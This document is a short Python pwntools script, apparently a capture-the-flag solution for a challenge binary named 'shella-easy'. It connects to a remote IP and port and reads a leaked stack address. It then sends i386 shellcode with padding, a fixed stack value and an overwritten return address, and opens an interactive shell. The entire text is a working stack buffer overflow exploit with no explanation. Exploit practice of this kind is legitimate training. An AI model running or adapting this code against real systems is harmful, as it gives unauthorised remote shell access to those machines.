from pwn import *

addr_re = r'Yeah I\'ll have a 0x([a-f0-9]+) with a side of fries thanks'

# r = process('./shella-easy')
r = remote('52.15.182.55', 12345)

addr = int(re.search(addr_re, r.recvline()).group(1), 16)

# Shellcode
shellcode = asm(shellcraft.i386.linux.sh())
# Padding
shellcode += (64 - len(shellcode)) * 'A'
# Stack variable
shellcode += p32(0xDEADBEEF)
# More padding
shellcode += 'A' * 8
# Return address
shellcode += p32(addr)

r.sendline(shellcode)

r.interactive()
